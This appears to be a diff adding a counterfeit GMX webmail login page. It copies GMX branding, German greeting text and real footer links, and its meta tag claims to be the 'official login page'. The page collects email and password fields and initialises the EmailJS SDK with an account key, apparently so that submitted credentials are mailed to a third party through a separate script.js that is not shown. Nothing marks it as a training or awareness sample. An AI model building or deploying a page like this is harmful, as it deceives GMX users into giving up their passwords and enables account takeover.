@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="this is GMX official login page">
+  <link rel="stylesheet" href="style.css">
+
+  <style data-styles="">
+    ion-icon {
+      visibility: hidden;
+    }
+
+    .hydrated {
+      visibility: inherit;
+    }
+  </style>
+
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <script type="text/javascript">
+    emailjs.init('fL7mesBf75xf6lxBl')
+  </script>
+
+  <title>GMX</title>
+</head>
+
+<body>
+
+  <main>
+
+    <form id="form">
+      <div class="container">
+
+        <!-- LOGO -->
+        <div class="container-img">
+          <img class="img-logo" src="logo.webp" alt="">
+        </div>
+
+        <div class="container-mail-form">
+          <div class="mail-title-container">
+
+            <!-- MAIL TITLE -->
+            <h3 class="mail-title">Willkommen</h3>
+            <h3 class="mail-title-light">bei GMX</h3>
+          </div>
+
+          <div class="container-form">
+
+            <div class="email-container">
+              <input type="hidden" name="form-name" value="contact">
+
+              <input type="email" name="email" placeholder="Email" id="email" class="email-input" required="">
+            </div>
+
+            <div class="password-container">
+              <input type="password" name="password" placeholder="Passwort" id="password" class="password-input"
+                required="">
+
+              <span class="toggle-password" id="toggle-password">
+                <span id="closed-eye">🚫</span>
+                <span id="open-eye" class="hide">👁️</span>
+              </span>
+            </div>
+
+            <input type="submit" id="button" value="Login" class="submit-form">
+
+
+            <footer class="footer">
+              <div class="footer-content">
+                <p>&copy; 2026 GMX. All rights reserved.</p>
+
+                <div class="footer-links">
+                  <a href="https://www.gmx.net/mail/sicherheit/#.pc_page.homepage.index.footer.sicherheit"
+                    target="_blank" rel="noopener noreferrer">Sicherheit</a>
+
+                  <a href="https://hilfe.gmx.net/" target="_blank" rel="noopener noreferrer">Service</a>
+
+                  <a href="https://www.gmx.ch/impressum/" target="_blank" rel="noopener noreferrer" >Impressum</a>
+                  
+                </div>
+
+                <p class="footer-small"> A free email Service by GMX</p>
+              </div>
+            </footer>
+
+          </div>
+        </div>
+      </div>
+    </form>
+  </main>
+
+  <script src="./gmx.net_files/script.js.download"></script>
+  <script type="module" src="./gmx.net_files/ionicons.esm.js.download"></script>
+  <script nomodule="" src="./gmx.net_files/ionicons.js.download"></script>
+  <script type="text/javascript" src="./gmx.net_files/email.min.js.download"></script>
+
+  <script type="text/javascript">
+    emailjs.init('fL7mesBf75xf6lxBl')
+  </script>
+  <script src="script.js"></script>
+
+</body>
+
+</html>
